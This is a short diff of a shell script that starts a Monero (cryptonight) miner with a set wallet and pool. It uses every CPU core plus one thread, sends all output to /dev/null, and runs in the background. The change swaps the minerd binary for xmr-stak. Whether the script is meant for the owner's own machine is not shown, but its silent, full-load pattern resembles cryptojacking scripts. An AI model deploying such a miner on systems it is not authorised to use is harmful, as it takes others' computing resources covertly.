@@ -5,4 +5,4 @@ WALLET=44NoPqV96tfD5tvAmUHrpUEAf62LwDrABgTnmhPHM9g6Bkdk3nk7arB1V86TykSDUUT1bJHfK
 CORES=`cat /proc/cpuinfo | grep processor | wc -l`
 THREADS=$((CORES+1))
 
-/usr/local/bin/minerd -a cryptonight -o $POOL -u $WALLET -p x -t $THREADS > /dev/null &
+/usr/local/bin/xmr-stak -a cryptonight -o $POOL -u $WALLET -p x -t $THREADS > /dev/null &
